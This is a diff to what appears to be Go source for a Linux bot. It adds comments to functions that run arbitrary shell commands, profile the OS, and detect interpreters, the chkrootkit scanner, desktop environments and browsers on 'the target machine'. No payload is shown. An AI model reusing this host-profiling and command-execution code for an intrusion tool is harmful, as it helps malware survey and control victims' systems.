@@ -456,6 +456,7 @@ func _dirty_init() {
     tox.KeepPkg()
 }
 
+// TODO add error handling for if lsb_release is not installed
 func check_os() []byte {
     os_info, err := exec.Command("sh","-c", "lsb_release -a").Output()
     if err != nil {
@@ -475,7 +476,8 @@ func exists(path string) (bool, error) {
     return true, err
 }
 
-// Check for installed software
+// Check for installed compilers/interperters which might allow us to use
+// funcs written in something other than go
 func checkPython3Install() (bool) {
     installed, err := exists("/usr/bin/python3.5")
     if err != nil {
@@ -557,6 +559,7 @@ func checkChkrootkitInstall() (bool) {
     return installed
 }
 
+// We use sh -c in the system cal to work around gos need to know the number of flags when running a program
 func systemCall(command string) ([]byte) {
     cmd := exec.Command("sh", "-c", command)
     stdout, err := cmd.Output()
@@ -566,6 +569,8 @@ func systemCall(command string) ([]byte) {
     return stdout
 }
 
+// TODO add handling for if more than 1 DE is installed
+// This checks the DEs installed on the target machine
 func detectDE() (string) {
     mate, err := exists("/usr/share/mate")
     if  mate == true {
@@ -589,6 +594,7 @@ func detectDE() (string) {
     return "Unknown DE"
 }
 
+// Gets the running dir of the bot
 func getRunningDir() (string) {
     dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
     if err != nil {
@@ -597,6 +603,7 @@ func getRunningDir() (string) {
     return dir
 }
 
+// Checks what if any browsers are installed
 func detectBrowsers() (string) {
     firefox, err := exists("/usr/bin/firefox")
     chromium, err := exists("/usr/bin/chromium-browser")
